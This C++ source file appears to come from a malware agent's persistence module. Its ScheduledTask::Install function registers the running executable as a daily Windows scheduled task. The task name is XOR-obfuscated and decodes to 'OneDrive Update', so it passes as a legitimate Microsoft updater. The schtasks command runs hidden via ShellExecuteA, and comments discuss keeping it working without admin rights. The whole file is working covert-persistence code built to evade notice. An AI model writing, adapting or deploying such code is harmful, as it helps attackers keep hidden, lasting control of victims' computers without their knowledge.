#include "agent/modules/persistence/scheduled_task.hpp"
#include <windows.h>
#include <string>
#include <iostream>
#include "agent/utils/obfuscator.hpp" // Added

void ScheduledTask::Install() {
    char path[MAX_PATH];
    if(!GetModuleFileNameA(NULL, path, MAX_PATH)) return;
    
    // Construct schtasks command
    // /create /tn "OneDrive Update" /tr "\"C:\Path\To\Agent.exe\"" /sc DAILY /st 09:00 /f
    // /f forces overwrite if exists
    // /sc DAILY /st 09:00 runs it every day
    // Maybe ONLOGON is better? "/sc ONLOGON" requires admin usually? No, user tasks can trigger on logon.
    // Let's stick to DAILY for reliability or ONLOGON if possible. 
    // DAILY is safer for standard user context without admin.
    
    std::string taskName = Obfuscator::Deobfuscate({0x38, 0x19, 0x12, 0x33, 0x5, 0x1e, 0x1, 0x12, 0x57, 0x22, 0x7, 0x13, 0x16, 0x3, 0x12}, 0x77);
    std::string params = "/create /tn \"" + taskName + "\" /tr \"\\\"" + std::string(path) + "\\\"\" /sc DAILY /st 09:00 /f";
    
    // Execute hidden
    ShellExecuteA(NULL, "open", "schtasks", params.c_str(), NULL, SW_HIDE);
}
